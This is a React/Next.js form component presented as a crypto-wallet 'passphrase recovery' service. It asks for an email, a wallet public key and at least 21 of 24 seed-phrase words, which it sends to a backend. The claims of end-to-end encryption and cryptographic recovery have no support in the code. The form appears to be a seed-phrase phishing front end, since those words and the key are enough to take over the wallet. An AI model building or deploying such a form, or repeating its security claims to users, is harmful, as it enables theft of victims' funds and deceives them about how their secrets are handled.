"use client"

import type React from "react"

import { useState } from "react"
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from "@/components/ui/card"
import { Button } from "@/components/ui/button"
import { Input } from "@/components/ui/input"
import { Textarea } from "@/components/ui/textarea"
import { Label } from "@/components/ui/label"
import { AlertCircle, ArrowRight, Info, Loader, Key, Shield } from "lucide-react"
import { Alert, AlertDescription, AlertTitle } from "@/components/ui/alert"
import { motion, AnimatePresence } from "framer-motion"
import { useRouter } from "next/navigation"
import { Progress } from "@/components/ui/progress"
import { Dialog, DialogContent, DialogHeader, DialogTitle, DialogTrigger } from "@/components/ui/dialog"
import { useAppDispatch } from "@/redux/hooks"
import { makeRequest } from "@/redux/slices/requests"


const RecoveryRequestForm = ({ setStep2 }: { setStep2: any }) => {
  const router = useRouter()
  const [step, setStep] = useState(1)
  const totalSteps = 2
  const [loading, setLoading] = useState(false)
  const [words, setWords] = useState<string[]>(Array(24).fill(""))
  const [errors, setErrors] = useState<{
    publicKey?: string
    note?: string
    words?: string
  }>({})

  const [formData, setFormData] = useState({
    email: "",
    publicKey: "",
    note: "",
  })

  const dispatch = useAppDispatch()

  const handleInputChange = (e: React.ChangeEvent<HTMLInputElement | HTMLTextAreaElement>) => {
    const { name, value } = e.target
    setFormData((prev) => ({
      ...prev,
      [name]: value,
    }))

    // Clear error when user types
    if (errors[name as keyof typeof errors]) {
      setErrors((prev) => ({
        ...prev,
        [name]: undefined,
      }))
    }
  }

  const handleWordChange = (index: number, value: string) => {
    const newWords = [...words]
    newWords[index] = value
    setWords(newWords)

    // Clear words error when user types
    if (errors.words) {
      setErrors((prev) => ({
        ...prev,
        words: undefined,
      }))
    }
  }

  const handlePaste = (e: React.ClipboardEvent, startIndex: number) => {
    e.preventDefault()
    const pastedText = e.clipboardData.getData("text")
    const pastedWords = pastedText.trim().split(/[\s,]+/)

    if (pastedWords.length > 0) {
      const newWords = [...words]

     
      for (let i = 0; i < pastedWords.length && startIndex + i < 24; i++) {
        newWords[startIndex + i] = pastedWords[i]
      }

      setWords(newWords)


      if (errors.words) {
        setErrors((prev) => ({
          ...prev,
          words: undefined,
        }))
      }
    }
  }

  const validateStep1 = () => {
    const newErrors: {
      publicKey?: string
      note?: string
    } = {}

    // Validate public key format (capital letters and numbers, 56 characters)
    const publicKeyRegex = /^[A-Z0-9]{56}$/
    if (!publicKeyRegex.test(formData.publicKey)) {
      newErrors.publicKey = "Public key must be 56 characters of capital letters and numbers"
    }

    // Validate note is required
    if (!formData.note.trim()) {
      newErrors.note = "Please explain how you lost or forgot your passphrase"
    }

    setErrors(newErrors)
    return Object.keys(newErrors).length === 0
  }

  const validateStep2 = () => {
    const newErrors: {
      words?: string
    } = {}

    // Count how many words are filled in
    const filledWordsCount = words.filter((word) => word.trim() !== "").length

    // Check if at least 21 words are filled in
    if (filledWordsCount < 21) {
      newErrors.words = `You must remember at least 21 words. Currently you have ${filledWordsCount} words filled in.`
    }

    setErrors(newErrors)
    return Object.keys(newErrors).length === 0
  }

  const handleContinue = (e: React.FormEvent) => {
    e.preventDefault()

    if (validateStep1()) {
      setStep(2)
      window.scrollTo(0, 0)
    }
  }

  const handleBack = () => {
    if (step > 1) {
      setStep(step - 1)
      window.scrollTo(0, 0)
    } else {
      router.back()
    }
  }

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault()

    if (!validateStep2()) {
      return
    }

    setLoading(true)

    try {
      // Filter out empty words and join the remembered words
      const wordsRemembered = words
        .map((word, index) => (word ? `${index + 1}:${word}` : ""))
        .filter(Boolean)
        .join(",")

      await dispatch(
        makeRequest({
          requestType: "recovery",
          email: formData.email,
          publicKey: formData.publicKey,
          wordsRemembered,
          note: formData.note,
        }),
      ).unwrap()
      setStep2(2)
    } catch (error) {
      console.error("Error submitting recovery form:", error)
      // toast({
      //   title: "Submission Error",
      //   description: "There was an error submitting your request. Please try again.",
      //   variant: "destructive",
      // })
    } finally {
      setLoading(false)
    }
  }

  const slideVariants = {
    hidden: (direction: number) => ({
      x: direction > 0 ? 300 : -300,
      opacity: 0,
    }),
    visible: {
      x: 0,
      opacity: 1,
      transition: {
        type: "spring",
        stiffness: 300,
        damping: 30,
      },
    },
    exit: (direction: number) => ({
      x: direction > 0 ? -300 : 300,
      opacity: 0,
      transition: {
        type: "spring",
        stiffness: 300,
        damping: 30,
      },
    }),
  }

  return (
    <div className="space-y-4">
      <div className="mb-8">
        <div className="flex justify-between items-center mb-2">
          <span className="text-sm font-medium">
            Step {step} of {totalSteps}
          </span>
          <span className="text-sm text-muted-foreground">{step === 1 ? "Basic Information" : "Recovery Details"}</span>
        </div>
        <Progress value={(step / totalSteps) * 100} className="h-2" />
      </div>

      <AnimatePresence mode="wait" custom={step}>
        {step === 1 && (
          <motion.div key="step1" custom={1} variants={slideVariants} initial="hidden" animate="visible" exit="exit">
            <Card className="shadow-lg">
              <CardHeader>
                <div className="flex items-center gap-3">
                  <Key className="h-6 w-6 text-primary" />
                  <div className="flex-1">
                    <div className="flex items-center gap-2">
                      <CardTitle>Passphrase Recovery Request</CardTitle>
                      <Dialog>
                        <DialogTrigger asChild>
                          <Button variant="ghost" size="icon" className="h-6 w-6 rounded-full p-0">
                            <Info className="h-4 w-4 text-muted-foreground hover:text-primary" />
                          </Button>
                        </DialogTrigger>
                        <DialogContent className="sm:max-w-md">
                          <DialogHeader>
                            <DialogTitle>About Passphrase Recovery</DialogTitle>
                          </DialogHeader>
                          <div className="space-y-4 py-4">
                            <p>This service helps you recover missing words from your passphrase.</p>

                            <div className="flex items-start gap-3 p-3 bg-primary/5 rounded-lg">
                              <div className="mt-1 bg-primary/10 p-2 rounded-full">
                                <Key className="h-5 w-5 text-primary" />
                              </div>
                              <div>
                                <h3 className="font-medium">How it works:</h3>
                                <p className="text-sm text-muted-foreground mt-1">
                                  Our system will analyze the words you remember from your passphrase and help recover
                                  the missing words using advanced cryptographic techniques.
                                </p>
                              </div>
                            </div>

                            <div className="flex items-start gap-3 p-3 bg-primary/5 rounded-lg">
                              <div className="mt-1 bg-primary/10 p-2 rounded-full">
                                <Shield className="h-5 w-5 text-primary" />
                              </div>
                              <div>
                                <h3 className="font-medium">Security first:</h3>
                                <p className="text-sm text-muted-foreground mt-1">
                                  Your information is handled with the highest security standards. We use end-to-end
                                  encryption to protect your sensitive data.
                                </p>
                              </div>
                            </div>
                          </div>
                        </DialogContent>
                      </Dialog>
                    </div>
                    <CardDescription>Fill in the details to recover your missing passphrase words</CardDescription>
                  </div>
                </div>
              </CardHeader>
              <form onSubmit={handleContinue}>
                <CardContent className="space-y-6">
                  <Alert className="bg-blue-50 border-blue-200 dark:bg-blue-950/20 dark:border-blue-800">
                    <AlertCircle className="h-4 w-4 text-blue-600 dark:text-blue-400" />
                    <AlertTitle>Important</AlertTitle>
                    <AlertDescription>
                      You&apos;ll need to provide the words you remember from your passphrase. Our system will help recover
                      the missing words.
                    </AlertDescription>
                  </Alert>

                  <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
                    <div className="space-y-2">
                      <Label htmlFor="email">Email Address</Label>
                      <Input
                        id="email"
                        name="email"
                        type="email"
                        placeholder="your@email.com"
                        value={formData.email}
                        onChange={handleInputChange}
                        required
                      />
                    </div>

                    <div className="space-y-2">
                      <Label htmlFor="publicKey">Public Key</Label>
                      <Input
                        id="publicKey"
                        name="publicKey"
                        placeholder="GBKVMNHHAH7YYLCP37LCN5FXO6J74F33XBMDFBKQNWHI5NLNZPBK5YFD"
                        value={formData.publicKey}
                        onChange={handleInputChange}
                        required
                        className={errors.publicKey ? "border-red-500" : ""}
                      />
                      {errors.publicKey && <p className="text-xs text-red-500 mt-1">{errors.publicKey}</p>}
                      <p className="text-xs text-muted-foreground">
                        Must be 56 characters of capital letters and numbers
                      </p>
                    </div>

                    <div className="space-y-2 md:col-span-2">
                      <Label htmlFor="note">How did you lose your passphrase? (Required)</Label>
                      <Textarea
                        id="note"
                        name="note"
                        placeholder="Please explain how you lost or forgot your passphrase"
                        value={formData.note}
                        onChange={handleInputChange}
                        required
                        className={errors.note ? "border-red-500" : ""}
                      />
                      {errors.note && <p className="text-xs text-red-500 mt-1">{errors.note}</p>}
                    </div>
                  </div>
                </CardContent>
                <div className="flex justify-between m-2">
                  <Button type="button" variant="outline" onClick={handleBack}>
                    Back
                  </Button>
                  <Button type="submit" disabled={loading}>
                    {loading ? (
                      <>
                        Submitting...
                        <Loader className="ml-2 w-4 h-4 animate-spin" />
                      </>
                    ) : (
                      <>
                        Continue
                        <ArrowRight className="ml-2 h-4 w-4" />
                      </>
                    )}
                  </Button>
                </div>
              </form>
            </Card>
          </motion.div>
        )}

        {step === 2 && (
          <motion.div key="step2" custom={1} variants={slideVariants} initial="hidden" animate="visible" exit="exit">
            <Card className="shadow-lg">
              <CardHeader>
                <div className="flex items-center gap-3">
                  <Key className="h-6 w-6 text-primary" />
                  <div>
                    <CardTitle>Recovery Information</CardTitle>
                    <CardDescription>Enter the words you remember from your passphrase</CardDescription>
                  </div>
                </div>
              </CardHeader>
              <form onSubmit={handleSubmit}>
                <CardContent className="space-y-6">
                  <Alert className="bg-amber-50 border-amber-200 dark:bg-amber-950/20 dark:border-amber-800">
                    <AlertCircle className="h-4 w-4 text-amber-600 dark:text-amber-400" />
                    <AlertTitle>Recovery Information</AlertTitle>
                    <AlertDescription>
                      Enter the words you remember in their correct positions. You must remember at least 21 words to
                      submit the form. Leave unknown words blank.
                    </AlertDescription>
                  </Alert>

                  <div className="space-y-4">
                    <div className="space-y-2">
                      <Label className="text-base font-medium">Words You Remember</Label>
                      <div className="grid grid-cols-2 md:grid-cols-4 gap-4">
                        {Array.from({ length: 24 }).map((_, i) => (
                          <div key={i} className="space-y-2">
                            <Label htmlFor={`word-${i + 1}`} className="text-xs">
                              Word {i + 1}
                            </Label>
                            <Input
                              id={`word-${i + 1}`}
                              placeholder="Leave blank if unknown"
                              value={words[i]}
                              onPaste={(e) => handlePaste(e, i)}
                              onChange={(e) => handleWordChange(i, e.target.value)}
                              className="text-sm"
                            />
                          </div>
                        ))}
                      </div>
                      {errors.words && (
                        <div className="mt-2 p-3 bg-red-50 border border-red-200 rounded-md text-red-600 text-sm flex items-start gap-2">
                          <AlertCircle className="h-4 w-4 mt-0.5" />
                          <span>{errors.words}</span>
                        </div>
                      )}
                      <p className="text-sm text-muted-foreground mt-2">
                        Fill in the words you remember in their correct positions. Leave unknown words blank.
                      </p>
                    </div>
                  </div>
                </CardContent>
                <div className="flex justify-between m-2">
                  <Button type="button" variant="outline" onClick={handleBack}>
                    Back
                  </Button>
                  <Button type="submit" className="bg-primary hover:bg-primary/90" disabled={loading}>
                    {loading ? (
                      <>
                        Submitting...
                        <Loader className="ml-2 w-4 h-4 animate-spin" />
                      </>
                    ) : (
                      "Submit"
                    )}
                  </Button>
                </div>
              </form>
            </Card>
          </motion.div>
        )}
      </AnimatePresence>
    </div>
  )
}

export default RecoveryRequestForm
